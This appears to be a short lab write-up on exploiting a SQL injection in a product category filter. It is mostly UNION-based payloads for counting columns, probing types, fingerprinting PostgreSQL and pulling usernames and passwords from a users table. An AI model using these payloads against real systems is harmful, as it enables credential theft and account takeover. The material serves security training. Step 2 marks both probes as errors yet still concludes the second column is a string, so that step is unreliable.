SQL Injection in the product category filter

Goal: retrieve all usernames and passwords and login as the administrator user.

Analysis:
---------

==========Step 1: Determine the number of columns that the vulnerable query is using==========
' order by 1--      /*The first column is the title*/
' order by 2--      /*The second column is the text*/
' order by 3--      !Error!
-> The number of columns 2

==========Step 2: Determine the data type of columns==========
select a,b from products where category='Gifts

' UNION select 'a', NULL--      !Error!
' UNION select NULL, 'a'--      !Error!
-> The second column is of data type string.

==========Solution==========
' UNION select NULL, username from users--
' UNION select NULL, password from users--

====Find the version of the database====
' UNION select NULL, @@version-- 
-> error, It's not Microsoft or MySQL.

' UNION select NULL, version()--
-> PostgreSQL 12.16 (Ubuntu 12.16-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit

' UNION select NULL, username || '~' || password from users--

/*If there were only one column that is output on the page or only one column that has data type of string, I will have to output each column on each own.*/
